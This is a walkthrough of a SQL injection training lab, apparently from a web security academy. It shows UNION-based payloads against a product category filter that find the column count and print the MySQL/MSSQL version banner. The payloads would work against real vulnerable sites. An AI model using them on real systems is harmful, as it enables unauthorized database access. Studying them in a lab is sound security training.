## SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint :

You can find some useful payloads on our SQL injection cheat sheet.

## Notes

- `/filter?category=Gifts`
- MySQL / Microsoft SQL Server
- Using `@@version` to dump database version

## Resume

1. Capture the `filter` request
2. Find the number of columns
3. Find which column reflects data
4. Dump database version

## Solve

First, test the number of columns using a UNION SELECT payload.

Try with 3 columns :

```
/filter?category=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--%20-
```

This returns :

```
Internal Server Error
```

Retry with only 2 columns :

```
/filter?category=%27%20UNION%20ALL%20SELECT%20NULL,NULL--%20-
```

This time the request works correctly, confirming that the query contains **2 columns**.

Now test which column reflects data using the `@@version` variable :

```
/filter?category=' UNION ALL SELECT NULL,@@version-- -
```

and :

```
/filter?category=' UNION ALL SELECT @@version,NULL-- -
```

Both payloads successfully display the database version banner directly inside the page.